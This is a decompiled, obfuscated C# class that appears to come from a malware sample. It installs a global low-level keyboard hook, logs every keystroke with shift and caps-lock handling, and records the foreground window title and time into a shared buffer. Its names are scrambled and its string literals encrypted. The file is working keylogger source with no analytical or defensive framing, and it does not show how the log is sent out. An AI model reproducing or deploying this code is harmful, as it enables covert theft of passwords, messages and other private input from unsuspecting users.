using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal class Class7
{
	private delegate int Delegate0(int int_0, int int_1, ref Struct0 struct0_0);

	public struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;
	}

	private static Delegate0 delegate0_0 = null;

	private static IntPtr intptr_0 = (IntPtr)0;

	private static string string_0 = null;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_0, Delegate0 delegate0_1, int int_1, int int_2);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr intptr_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_0, uint uint_2, IntPtr intptr_1);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_1, ref int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_0);

	public static string smethod_0(IntPtr intptr_1)
	{
		try
		{
			if (intptr_1.ToInt32() <= 0)
			{
				return null;
			}
			int windowTextLength = GetWindowTextLength(intptr_1);
			if (windowTextLength == 0)
			{
				return null;
			}
			StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
			GetWindowTextA((int)intptr_1, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString().Trim();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_1()
	{
		try
		{
			delegate0_0 = smethod_2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			intptr_0 = (IntPtr)SetWindowsHookExA(13, delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static int smethod_2(int int_0, int int_1, ref Struct0 struct0_0)
	{
		try
		{
			string text = smethod_0(GetForegroundWindow());
			if (Operators.CompareString(text, string_0, false) != 0)
			{
				string_0 = text;
				Class5.string_1 = Class5.string_1 + "\r\n[::-- " + text + " || " + DateTime.Now.ToString() + " --::]\r\n\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "";
			if (int_1 == 260 || int_1 == 256)
			{
				switch (struct0_0.int_0)
				{
				case 8:
					Class5.string_1 = Class5.string_1.Substring(0, Class5.string_1.Length - 1);
					break;
				case 9:
					text2 = Class6.smethod_0("Q5mdsaSAXiU=", "False");
					break;
				case 13:
					text2 = "\r\n";
					break;
				case 20:
					text2 = ((!Control.IsKeyLocked((Keys)20)) ? Class6.smethod_0("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : Class6.smethod_0("QpiLkJF1XZSehG1dl5WHf10m", "False"));
					break;
				case 27:
					text2 = Class6.smethod_0("S6GWy62IZh0=", "False");
					break;
				case 32:
					text2 = Class6.smethod_0("RyA=", "False");
					break;
				case 33:
					text2 = Class6.smethod_0("Zbu708uqtdvPhAE=", "False");
					break;
				case 34:
					text2 = Class6.smethod_0("VKqqwrqZk8nYwZFvFA==", "False");
					break;
				case 35:
					text2 = Class6.smethod_0("R52SwqqEYiE=", "False");
					break;
				case 36:
					text2 = Class6.smethod_0("WrCo1safsoAP", "False");
					break;
				case 37:
					text2 = Class6.smethod_0("U6mVvXIT", "False");
					break;
				case 38:
					text2 = Class6.smethod_0("SJ6ssmce", "False");
					break;
				case 39:
					text2 = Class6.smethod_0("X7WjyX4H", "False");
					break;
				case 40:
					text2 = Class6.smethod_0("O5GXpVor", "False");
					break;
				case 46:
					text2 = Class6.smethod_0("WrCkzMWXdQ4=", "False");
					break;
				case 91:
				case 92:
					text2 = Class6.smethod_0("Q5mgubBls73EsZGbaSY=", "False");
					break;
				case 96:
					text2 = Class6.smethod_0("dQI=", "False");
					break;
				case 97:
					text2 = Class6.smethod_0("Wx0=", "False");
					break;
				case 98:
					text2 = Class6.smethod_0("ZhM=", "False");
					break;
				case 99:
					text2 = Class6.smethod_0("SjA=", "False");
					break;
				case 100:
					text2 = Class6.smethod_0("TC8=", "False");
					break;
				case 101:
					text2 = Class6.smethod_0("VCg=", "False");
					break;
				case 102:
					text2 = Class6.smethod_0("WyI=", "False");
					break;
				case 103:
					text2 = Class6.smethod_0("dQk=", "False");
					break;
				case 104:
					text2 = Class6.smethod_0("Vyg=", "False");
					break;
				case 105:
					text2 = Class6.smethod_0("dwk=", "False");
					break;
				case 112:
				case 113:
				case 114:
				case 115:
				case 116:
				case 117:
				case 118:
				case 119:
				case 120:
				case 121:
				case 122:
				case 123:
				case 124:
				case 125:
				case 126:
				case 127:
				case 128:
				case 129:
				case 130:
				case 131:
				case 132:
				case 133:
				case 134:
				case 135:
					text2 = Class6.smethod_0("UaedGA==", "False") + Conversions.ToString(struct0_0.int_0 - 111) + Class6.smethod_0("o4EC", "False");
					break;
				case 144:
					text2 = ((!((Computer)Class2.smethod_0()).get_Keyboard().get_NumLock()) ? Class6.smethod_0("ZLq45tCQzs3cg5PNx5EG", "False") : Class6.smethod_0("SZ+dy7V1s7LBaHiqtbNoHQ==", "False"));
					break;
				case 16:
				case 160:
				case 161:
					text2 = null;
					break;
				case 162:
				case 163:
					text2 = Class6.smethod_0("Vaue0cKpwsrOsVUS", "False");
					break;
				case 18:
				case 164:
				case 165:
					text2 = Class6.smethod_0("W7Gi1M6Ydg0=", "False");
					break;
				case 186:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("cBI=", "False") : Class6.smethod_0("axY=", "False"));
					break;
				case 187:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("WSs=", "False") : Class6.smethod_0("bAY=", "False"));
					break;
				case 188:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("YhE=", "False") : Class6.smethod_0("XCc=", "False"));
					break;
				case 189:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("cAQ=", "False") : Class6.smethod_0("eC4=", "False"));
					break;
				case 190:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("ZRA=", "False") : Class6.smethod_0("bRg=", "False"));
					break;
				case 191:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("aQ0=", "False") : Class6.smethod_0("gQU=", "False"));
					break;
				case 192:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("lBM=", "False") : Class6.smethod_0("vQg=", "False"));
					break;
				default:
					try
					{
						text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? smethod_3((uint)struct0_0.int_0).ToLower() : smethod_3((uint)struct0_0.int_0).ToUpper());
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						text2 = "";
						ProjectData.ClearProjectError();
					}
					break;
				case 219:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("mgg=", "False") : Class6.smethod_0("wAI=", "False"));
					break;
				case 220:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("czA=", "False") : Class6.smethod_0("vwQ=", "False"));
					break;
				case 221:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("gSM=", "False") : Class6.smethod_0("rBg=", "False"));
					break;
				case 222:
					text2 = ((!(((Computer)Class2.smethod_0()).get_Keyboard().get_ShiftKeyDown() | Control.IsKeyLocked((Keys)20))) ? Class6.smethod_0("bQE=", "False") : Class6.smethod_0("Ths=", "False"));
					break;
				}
				Console.Write(text2);
				Class5.string_1 += text2;
				Class5.string_3 = Class5.string_1;
			}
			return 0;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			int result = 0;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_3(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)uint_0).ToString();
	}
}
